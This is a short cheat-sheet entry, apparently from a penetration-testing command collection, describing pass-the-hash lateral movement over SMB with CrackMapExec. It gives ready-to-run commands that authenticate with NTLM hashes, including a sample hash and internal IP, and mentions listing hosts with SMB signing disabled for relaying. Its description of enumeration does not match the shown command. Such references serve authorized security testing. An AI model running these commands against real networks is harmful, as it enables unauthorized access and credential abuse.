---
title: |
  Pass the hash 
description: |
  "CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks." - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will enumerate domain groups, local groups, logged on users, relative identifiers (RIDs), sessions, domain users, SMB shares/permissions, and get the domain password policy. Create a list of targets with SMB Signing disabled (required to relay).

  Other commands:

  	crackmapexec smb <target(s)> -u username -H NTHASH

  	crackmapexec smb 192.168.4.62 --local-auth -u LocalAdmin -H be9d428a7bd9fd16a18048593dc9b5f1

command: |
  crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
items:
  - Hash
services:
  - SMB
OS:
  - Linux
attack_types:
  - Lateral Movement
references:
  - https://github.com/byt3bl33d3r/CrackMapExec
  - https://github.com/byt3bl33d3r/CrackMapExec/wiki
---
